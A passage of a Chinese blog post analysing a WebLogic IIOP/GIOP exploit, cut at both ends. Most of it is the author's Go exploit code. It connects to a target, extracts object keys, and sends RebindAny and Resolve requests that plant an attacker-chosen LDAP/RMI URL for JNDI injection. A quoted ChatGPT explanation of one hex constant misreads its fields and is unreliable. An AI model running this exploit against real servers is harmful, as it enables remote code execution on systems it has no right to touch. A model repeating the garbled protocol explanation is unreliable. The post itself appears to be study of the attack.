class=\"keyword\">if</span> ver == <span class=\"string\">&quot;14&quot;</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;[*] weblogic 14&quot;</span>)</span><br><span class=\"line\">\t\twlsKey1 = <span class=\"string\">&quot;00424541080103000000000c41646&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;d696e53657276657200000000000000003349444c3a7765626c&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;6f6769632f636f7262612f636f732f6e616d696e672f4e616d6&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;96e67436f6e74657874416e793a312e30000000000002380000&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class=\"line\">\t\twlsKey2 = <span class=\"string\">&quot;00424541080103000000000c41646d696e53657276657&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;200000000000000003349444c3a7765626c6f6769632f636f72&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;62612f636f732f6e616d696e672f4e616d696e67436f6e74657&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;2e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;[!] error and exit&quot;</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\thost := hostConfig</span><br><span class=\"line\">\tport := portConfig</span><br><span class=\"line\">\tconn, err := net.Dial(<span class=\"string\">&quot;tcp&quot;</span>, fmt.Sprintf(<span class=\"string\">&quot;%s:%d&quot;</span>, host, port))</span><br><span class=\"line\">\trmi := ldapConfig</span><br><span class=\"line\">\t<span class=\"comment\">// [ldap len] [ldap string]</span></span><br><span class=\"line\">\tldap := hex.EncodeToString([]<span class=\"type\">byte</span>&#123;<span class=\"type\">byte</span>(<span class=\"built_in\">len</span>(rmi))&#125;)</span><br><span class=\"line\">\tldap += hex.EncodeToString([]<span class=\"type\">byte</span>(rmi))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocateRequest := &amp;giop.LocateRequest&#123;</span><br><span class=\"line\">\t\tHeader: &amp;giop.Header&#123;</span><br><span class=\"line\">\t\t\tMagic:        giop.D(giop.GIOP),</span><br><span class=\"line\">\t\t\tMajorVersion: []<span class=\"type\">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class=\"line\">\t\t\tMinorVersion: []<span class=\"type\">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class=\"line\">\t\t\tMessageFlags: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\tMessageType:  []<span class=\"type\">byte</span>&#123;giop.LocateRequestType&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tRequestId:     giop.Int32(<span class=\"number\">2</span>),</span><br><span class=\"line\">\t\tTargetAddress: giop.D(giop.KeyAddr),</span><br><span class=\"line\">\t\tKeyAddress:    giop.D(giop.NameService),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tgiop.Log(<span class=\"number\">2</span>, <span class=\"string\">&quot;LocateRequest&quot;</span>)</span><br><span class=\"line\">\t_, _ = conn.Write(locateRequest.Bytes())</span><br><span class=\"line\">\tbuf := <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">1024</span>*<span class=\"number\">10</span>)</span><br><span class=\"line\">\t_, _ = conn.Read(buf)</span><br><span class=\"line\"></span><br><span class=\"line\">\ttemp1 := <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">8</span>)</span><br><span class=\"line\">\ttemp2 := <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// GIOP Header</span></span><br><span class=\"line\">\t<span class=\"comment\">// IOR Prefix</span></span><br><span class=\"line\">\tiOff := <span class=\"number\">0x60</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> buf[iOff] != <span class=\"number\">0x00</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// ProfileHost</span></span><br><span class=\"line\">\t\tiOff++</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> iOff &gt; <span class=\"number\">1024</span>*<span class=\"number\">10</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> buf[iOff] == <span class=\"number\">0x00</span> &#123;</span><br><span class=\"line\">\t\tiOff++</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tp := <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">\tp[<span class=\"number\">0</span>] = buf[iOff]</span><br><span class=\"line\">\tiOff++</span><br><span class=\"line\">\tp[<span class=\"number\">1</span>] = buf[iOff]</span><br><span class=\"line\"></span><br><span class=\"line\">\ttempPort := <span class=\"type\">int</span>(binary.BigEndian.Uint16(p))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> tempPort != port &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlt := iOff - <span class=\"number\">0x60</span></span><br><span class=\"line\">\tfOff := <span class=\"number\">0x60</span> + lt + <span class=\"number\">0x75</span></span><br><span class=\"line\">\t<span class=\"comment\">// other cases</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> buf[fOff] == <span class=\"number\">0x00</span> &#123;</span><br><span class=\"line\">\t\tfOff++</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Fake ObjectKey1</span></span><br><span class=\"line\">\t<span class=\"built_in\">copy</span>(temp1[<span class=\"number\">0</span>:<span class=\"number\">8</span>], buf[fOff:fOff+<span class=\"number\">8</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">copy</span>(temp2[<span class=\"number\">4</span>:<span class=\"number\">8</span>], buf[fOff+<span class=\"number\">4</span>:fOff+<span class=\"number\">8</span>])</span><br><span class=\"line\">\t<span class=\"comment\">// Fake ObjectKey2</span></span><br><span class=\"line\">\t<span class=\"built_in\">copy</span>(temp2[<span class=\"number\">0</span>:<span class=\"number\">4</span>], []<span class=\"type\">byte</span>&#123;<span class=\"number\">0xff</span>, <span class=\"number\">0xff</span>, <span class=\"number\">0xff</span>, <span class=\"number\">0xff</span>&#125;)</span><br><span class=\"line\">\tkey1 = giop.E(temp1)</span><br><span class=\"line\">\tkey2 = giop.E(temp2)</span><br><span class=\"line\"></span><br><span class=\"line\">\twlsKey1 = strings.ReplaceAll(wlsKey1, <span class=\"string\">&quot;&#123;&#123;key1&#125;&#125;&quot;</span>, key1)</span><br><span class=\"line\"></span><br><span class=\"line\">\trebindAny := &amp;giop.RebindRequest&#123;</span><br><span class=\"line\">\t\tHeader: &amp;giop.Header&#123;</span><br><span class=\"line\">\t\t\tMagic:        giop.D(giop.GIOP),</span><br><span class=\"line\">\t\t\tMajorVersion: []<span class=\"type\">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class=\"line\">\t\t\tMinorVersion: []<span class=\"type\">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class=\"line\">\t\t\tMessageFlags: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\tMessageType:  []<span class=\"type\">byte</span>&#123;giop.RequestType&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tRequestId:        giop.Int32(<span class=\"number\">3</span>),</span><br><span class=\"line\">\t\tResponseFlags:    []<span class=\"type\">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class=\"line\">\t\tTargetAddress:    giop.D(giop.KeyAddr),</span><br><span class=\"line\">\t\tKeyAddress:       giop.D(wlsKey1),</span><br><span class=\"line\">\t\tRequestOperation: giop.D(giop.RebindAnyOp),</span><br><span class=\"line\">\t\tServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class=\"line\">\t\t\tSequenceLength: giop.Int32(<span class=\"number\">6</span>),</span><br><span class=\"line\">\t\t\tServiceContext: []*giop.ServiceContext&#123;</span><br><span class=\"line\">\t\t\t\tServiceContext0,</span><br><span class=\"line\">\t\t\t\tServiceContext1,</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tVSCID:      giop.D(<span class=\"string\">&quot;000000&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tSCID:       giop.D(<span class=\"string\">&quot;06&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\t\t\tData: giop.D(<span class=\"string\">&quot;0000000000002849444c3a6f6d672e6f72672f53656e64696e67436&quot;</span> +</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"string\">&quot;f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000&quot;</span> +</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"string\">&quot;d3137322e32362e3131322e310000ec5b000000640042454108010300000000010000000000000&quot;</span> +</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"string\">&quot;0000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f646542617&quot;</span> +</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"string\">&quot;3653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdeb&quot;</span> +</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"string\">&quot;c0d227000000001000000010000002c00000000000100200000000300010020000100010501000&quot;</span> +</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"string\">&quot;10001010000000003000101000001010905010001&quot;</span>),</span><br><span class=\"line\">\t\t\t\t&#125;,</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tVSCID:      giop.D(<span class=\"string\">&quot;000000&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tSCID:       giop.D(<span class=\"string\">&quot;0f&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\t\t\tData:       giop.D(<span class=\"string\">&quot;00000000000000000000000000000100000000000000000100000000000000&quot;</span>),</span><br><span class=\"line\">\t\t\t\t&#125;,</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tVSCID:      giop.D(<span class=\"string\">&quot;424541&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tSCID:       giop.D(<span class=\"string\">&quot;03&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\t\t\tData:       giop.D(<span class=\"string\">&quot;00000000000000&quot;</span> + key2 + <span class=\"string\">&quot;00000000&quot;</span>),</span><br><span class=\"line\">\t\t\t\t&#125;,</span><br><span class=\"line\">\t\t\t\tServiceContext2,</span><br><span class=\"line\">\t\t\t&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tStubData: giop.D(<span class=\"string\">&quot;0000000000000001000000047465737400000001000000000000001d0000001c00000000000000010&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;412f57537472696e6756616c75653a312e300000000000&quot;</span> + ldap),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tgiop.Log(<span class=\"number\">3</span>, <span class=\"string\">&quot;RebindRequest&quot;</span>)</span><br><span class=\"line\">\t_, _ = conn.Write(rebindAny.Bytes())</span><br><span class=\"line\">\tbuf = <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">1024</span>*<span class=\"number\">10</span>)</span><br><span class=\"line\">\t_, _ = conn.Read(buf)</span><br><span class=\"line\"></span><br><span class=\"line\">\tstartOff := <span class=\"number\">0x64</span> + lt + <span class=\"number\">0xc0</span> + <span class=\"built_in\">len</span>(host) + <span class=\"comment\">// SendingContextRuntime</span></span><br><span class=\"line\">\t\t<span class=\"number\">0xac</span> + lt + <span class=\"comment\">// IOR ProfileHost ProfilePort</span></span><br><span class=\"line\">\t\t<span class=\"number\">0x5d</span> <span class=\"comment\">// ObjectKey Prefix</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> buf[startOff] != <span class=\"number\">0x32</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> startOff &gt; <span class=\"number\">0x2710</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">// InternalKey Offset</span></span><br><span class=\"line\">\t\tstartOff++</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> startOff &gt; <span class=\"number\">0x2710</span> &#123;</span><br><span class=\"line\">\t\tkey3 = giop.E([]<span class=\"type\">byte</span>&#123;<span class=\"number\">0x32</span>, <span class=\"number\">0x38</span>, <span class=\"number\">0x39</span>, <span class=\"number\">0x00</span>&#125;)</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tkey3 = giop.E(buf[startOff : startOff+<span class=\"number\">4</span>])</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\twlsKey2 = strings.ReplaceAll(wlsKey2, <span class=\"string\">&quot;&#123;&#123;key3&#125;&#125;&quot;</span>, key3)</span><br><span class=\"line\">\twlsKey2 = strings.ReplaceAll(wlsKey2, <span class=\"string\">&quot;&#123;&#123;key1&#125;&#125;&quot;</span>, key1)</span><br><span class=\"line\"></span><br><span class=\"line\">\trebindAnyTwice := &amp;giop.RebindRequest&#123;</span><br><span class=\"line\">\t\tHeader: &amp;giop.Header&#123;</span><br><span class=\"line\">\t\t\tMagic:        giop.D(giop.GIOP),</span><br><span class=\"line\">\t\t\tMajorVersion: []<span class=\"type\">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class=\"line\">\t\t\tMinorVersion: []<span class=\"type\">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class=\"line\">\t\t\tMessageFlags: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\tMessageType:  []<span class=\"type\">byte</span>&#123;giop.RequestType&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tRequestId:        giop.Int32(<span class=\"number\">4</span>),</span><br><span class=\"line\">\t\tResponseFlags:    []<span class=\"type\">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class=\"line\">\t\tTargetAddress:    giop.D(giop.KeyAddr),</span><br><span class=\"line\">\t\tKeyAddress:       giop.D(wlsKey2),</span><br><span class=\"line\">\t\tRequestOperation: giop.D(giop.RebindAnyOp),</span><br><span class=\"line\">\t\tServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class=\"line\">\t\t\tSequenceLength: giop.Int32(<span class=\"number\">4</span>),</span><br><span class=\"line\">\t\t\tServiceContext: []*giop.ServiceContext&#123;</span><br><span class=\"line\">\t\t\t\tServiceContext0,</span><br><span class=\"line\">\t\t\t\tServiceContext1,</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tVSCID:      giop.D(<span class=\"string\">&quot;424541&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tSCID:       giop.D(<span class=\"string\">&quot;03&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\t\t\tData:       giop.D(<span class=\"string\">&quot;00000000000000&quot;</span> + key2 + <span class=\"string\">&quot;00000000&quot;</span>),</span><br><span class=\"line\">\t\t\t\t&#125;,</span><br><span class=\"line\">\t\t\t\tServiceContext2,</span><br><span class=\"line\">\t\t\t&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tStubData: giop.D(<span class=\"string\">&quot;00000001000000047465737400000001000000000000001d0000001c00000000000000010&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;412f57537472696e6756616c75653a312e300000000000&quot;</span> + ldap),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tgiop.Log(<span class=\"number\">4</span>, <span class=\"string\">&quot;RebindRequest&quot;</span>)</span><br><span class=\"line\">\t_, _ = conn.Write(rebindAnyTwice.Bytes())</span><br><span class=\"line\">\tbuf = <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">1024</span>*<span class=\"number\">10</span>)</span><br><span class=\"line\">\t_, _ = conn.Read(buf)</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocateRequest2 := &amp;giop.LocateRequest&#123;</span><br><span class=\"line\">\t\tHeader: &amp;giop.Header&#123;</span><br><span class=\"line\">\t\t\tMagic:        giop.D(giop.GIOP),</span><br><span class=\"line\">\t\t\tMajorVersion: []<span class=\"type\">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class=\"line\">\t\t\tMinorVersion: []<span class=\"type\">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class=\"line\">\t\t\tMessageFlags: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\tMessageType:  []<span class=\"type\">byte</span>&#123;giop.LocateRequestType&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tRequestId:     giop.Int32(<span class=\"number\">5</span>),</span><br><span class=\"line\">\t\tTargetAddress: giop.D(giop.KeyAddr),</span><br><span class=\"line\">\t\tKeyAddress:    giop.D(giop.NameService),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tgiop.Log(<span class=\"number\">5</span>, <span class=\"string\">&quot;LocateRequest&quot;</span>)</span><br><span class=\"line\">\t_, _ = conn.Write(locateRequest2.Bytes())</span><br><span class=\"line\">\tbuf = <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">1024</span>*<span class=\"number\">10</span>)</span><br><span class=\"line\">\t_, _ = conn.Read(buf)</span><br><span class=\"line\"></span><br><span class=\"line\">\tresolve := &amp;giop.ResolveRequest&#123;</span><br><span class=\"line\">\t\tHeader: &amp;giop.Header&#123;</span><br><span class=\"line\">\t\t\tMagic:        giop.D(giop.GIOP),</span><br><span class=\"line\">\t\t\tMajorVersion: []<span class=\"type\">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class=\"line\">\t\t\tMinorVersion: []<span class=\"type\">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class=\"line\">\t\t\tMessageFlags: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\tMessageType:  []<span class=\"type\">byte</span>&#123;giop.RequestType&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tRequestId:        giop.Int32(<span class=\"number\">6</span>),</span><br><span class=\"line\">\t\tResponseFlags:    []<span class=\"type\">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class=\"line\">\t\tTargetAddress:    giop.D(giop.KeyAddr),</span><br><span class=\"line\">\t\tKeyAddress:       giop.D(wlsKey1),</span><br><span class=\"line\">\t\tRequestOperation: giop.D(giop.ResolveOp),</span><br><span class=\"line\">\t\tServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class=\"line\">\t\t\tSequenceLength: giop.Int32(<span class=\"number\">4</span>),</span><br><span class=\"line\">\t\t\tServiceContext: []*giop.ServiceContext&#123;</span><br><span class=\"line\">\t\t\t\tServiceContext0,</span><br><span class=\"line\">\t\t\t\tServiceContext1,</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tVSCID:      giop.D(<span class=\"string\">&quot;424541&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tSCID:       giop.D(<span class=\"string\">&quot;03&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\t\t\tData:       giop.D(<span class=\"string\">&quot;00000000000000&quot;</span> + key2 + <span class=\"string\">&quot;00000000&quot;</span>),</span><br><span class=\"line\">\t\t\t\t&#125;,</span><br><span class=\"line\">\t\t\t\tServiceContext2,</span><br><span class=\"line\">\t\t\t&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tCosNamingDissector: giop.D(<span class=\"string\">&quot;00000000000000010000000574657374000000000000000100&quot;</span>),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tgiop.Log(<span class=\"number\">6</span>, <span class=\"string\">&quot;ResolveRequest&quot;</span>)</span><br><span class=\"line\">\t_, _ = conn.Write(resolve.Bytes())</span><br><span class=\"line\">\tbuf = <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">1024</span>*<span class=\"number\">10</span>)</span><br><span class=\"line\">\t_, _ = conn.Read(buf)</span><br><span class=\"line\"></span><br><span class=\"line\">\tresolveTwice := &amp;giop.ResolveRequest&#123;</span><br><span class=\"line\">\t\tHeader: &amp;giop.Header&#123;</span><br><span class=\"line\">\t\t\tMagic:        giop.D(giop.GIOP),</span><br><span class=\"line\">\t\t\tMajorVersion: []<span class=\"type\">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class=\"line\">\t\t\tMinorVersion: []<span class=\"type\">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class=\"line\">\t\t\tMessageFlags: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\tMessageType:  []<span class=\"type\">byte</span>&#123;giop.RequestType&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tRequestId:        giop.Int32(<span class=\"number\">7</span>),</span><br><span class=\"line\">\t\tResponseFlags:    []<span class=\"type\">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class=\"line\">\t\tTargetAddress:    giop.D(giop.KeyAddr),</span><br><span class=\"line\">\t\tKeyAddress:       giop.D(wlsKey2),</span><br><span class=\"line\">\t\tRequestOperation: giop.D(giop.ResolveOp),</span><br><span class=\"line\">\t\tServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class=\"line\">\t\t\tSequenceLength: giop.Int32(<span class=\"number\">4</span>),</span><br><span class=\"line\">\t\t\tServiceContext: []*giop.ServiceContext&#123;</span><br><span class=\"line\">\t\t\t\tServiceContext0,</span><br><span class=\"line\">\t\t\t\tServiceContext1,</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tVSCID:      giop.D(<span class=\"string\">&quot;424541&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tSCID:       giop.D(<span class=\"string\">&quot;03&quot;</span>),</span><br><span class=\"line\">\t\t\t\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\t\t\t\tData:       giop.D(<span class=\"string\">&quot;00000000000000&quot;</span> + key2 + <span class=\"string\">&quot;00000000&quot;</span>),</span><br><span class=\"line\">\t\t\t\t&#125;,</span><br><span class=\"line\">\t\t\t\tServiceContext2,</span><br><span class=\"line\">\t\t\t&#125;,</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tCosNamingDissector: giop.D(<span class=\"string\">&quot;00000000000000010000000574657374000000000000000100&quot;</span>),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tgiop.Log(<span class=\"number\">7</span>, <span class=\"string\">&quot;ResolveRequest&quot;</span>)</span><br><span class=\"line\">\t_, _ = conn.Write(resolveTwice.Bytes())</span><br><span class=\"line\">\tbuf = <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">1024</span>*<span class=\"number\">10</span>)</span><br><span class=\"line\">\t_, _ = conn.Read(buf)</span><br><span class=\"line\"></span><br><span class=\"line\">\terr = conn.Close()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(err)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>开始看到这个脚本让我非常困惑，其中最多的就是奇奇怪怪的数字，后面问了问chatgpt才知道</p>\n<p>如</p>\n<figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">CosNamingDissector:</span> giop.D(<span class=\"string\">&quot;00000000000000010000000574657374000000000000000100&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>它表示一个GIOP（General Inter-ORB Protocol）消息的二进制编码。GIOP是CORBA（Common Object Request Broker Architecture）规范中定义的一种通信协议，用于在分布式对象系统中进行通信。</p>\n<p>具体来说，这个字节数组表示一个GIOP消息的头部，包括以下信息：</p>\n<ul>\n<li>00000000 00000001：GIOP版本号，这里表示版本1.0</li>\n<li>00000000 00000101：GIOP消息标志，这里表示请求消息</li>\n<li>74657374：GIOP消息类型，这里表示一个字符串消息</li>\n<li>00000000 00000001：请求消息的标识符，这里为1</li>\n</ul></blockquote>\n<p>该go脚本流程大致为</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" 